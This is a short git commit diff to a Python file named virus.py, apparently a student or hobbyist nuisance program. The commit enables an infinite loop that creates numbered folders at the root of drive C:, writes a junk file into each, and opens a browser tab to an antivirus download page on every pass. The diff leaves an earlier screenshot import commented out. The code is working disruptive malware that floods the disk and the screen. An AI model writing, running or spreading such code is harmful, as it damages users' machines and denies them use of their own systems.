80554d6fda1c7474be379841cc0445bc1b0fe031
Gianpietro Consiglio <gianpietro.consiglio13@gmail.com>
2022-04-22 13:10:39 -0300

    3.0

--- virus.py
+++ virus.py
@@ -1,18 +1,20 @@
 import os
-import pyscreenshot
+#import pyscreenshot
 import webbrowser as wb
 
 cont = 0
 while True:
     cont += 1
     try:
-        #os.mkdir(f"C:\\arquivo{cont}")
-        #os.chdir(f"C:\\arquivo{cont}")
+        os.mkdir(f"C:\\arquivo{cont}")
+        os.chdir(f"C:\\arquivo{cont}")
+        log = open('arquivo', 'a')
+        log.write("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
         print(f"Processo -> {cont}")
-              
+        
     except:
         pass
-    
+      
     else:
         wb.open('https://baidu-antivirus.br.uptodown.com/windows/download')
         #image = pyscreenshot.grab(bbox=(10, 10, 50, 50))
